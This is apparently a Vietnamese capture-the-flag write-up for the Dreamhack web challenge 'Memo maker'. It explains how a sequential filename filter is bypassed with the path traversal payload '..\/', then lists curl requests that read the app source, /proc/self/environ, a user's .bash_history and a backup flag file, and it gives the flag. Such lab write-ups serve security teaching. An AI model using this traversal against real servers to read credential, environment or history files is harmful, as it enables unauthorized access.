# Memo maker

<figure><img src="../../.gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>

## ANALYZE

### Phân tích <a href="#user-content-phan-tich" id="user-content-phan-tich"></a>

Ứng dụng thực hiện lọc (sanitize) tên file trong&#x20;

app.py bằng cách thay thế tuần tự các ký tự nguy hiểm:

```
f = filename.replace("//", "/")     
f = f.replace("../", "")            
f = f.replace("./", "")             
f = f.replace("\\\\", "\\")         
f = f.replace("\\", "")
```

**Kỹ thuật Bypass**: Sử dụng payload `..\/`.

* Dấu `\` chen giữa giúp chuỗi tránh bị khớp với `../` ở bước lọc thứ 2 (`replace("../", "")`).
* Dấu `\` sau đó bị xóa ở bước cuối cùng (`replace("\\", "")`), khôi phục lại chuỗi `../` hoàn chỉnh giúp ta leo thư mục.

## &#x20;EXPLOIT

1.  **Trinh sát**: Đọc source code&#x20;

    app.py để phân tích logic filter.

    ```
    curl "http://host3.dreamhack.games:10462/read?name=..\/app.py"
    ```



    ```
    @APP.route('/read')def read_memo():    ...    f = filename.replace("//", "/")    f = f.replace("../", "")    ...
    ```
2.  **Thu thập thông tin**: Đọc `/proc/self/environ` để xác định user hiện tại là `YP` và home directory là `/home/YP`.

    ```
    curl "http://host3.dreamhack.games:10462/read?name=..\/..\/proc/self/environ"
    ```



    ```
    PATH=/usr/local/bin:... HOME=/home/YP HOSTNAME=...
    ```
3.  **Tìm Kiếm Manh Mối**: Kiểm tra file cấu hình hoặc file nhạy cảm trong thư mục ứng dụng. Đọc `Secrets.txt`:

    ```
    curl "http://host3.dreamhack.games:10462/read?name=..\/Secrets.txt"
    ```



    ```
    Someone deleted the flag file.. Is it you?!Who are you!?
    ```
4.  **Truy vết Flag**: Không tìm thấy flag ở các đường dẫn thông thường. Kiểm tra lịch sử lệnh `.bash_history` của user `YP`:

    ```
    curl "http://host3.dreamhack.games:10462/read?name=..\/..\/home/YP/.bash_history"
    ```



    ```
    lspwdls -licp flag.txt /tmp/back_up_YP/flag.back.txtrm flag.txt
    ```
5.  **Lấy Flag**: Đọc file backup để lấy flag.

    ```
    curl "http://host3.dreamhack.games:10462/read?name=..\/..\/tmp/back_up_YP/flag.back.txt"
    ```

## **Flag**:&#x20;

`YP{ZASTQ1N8DYMMA7ZZCV74E9R42N2ST2}`





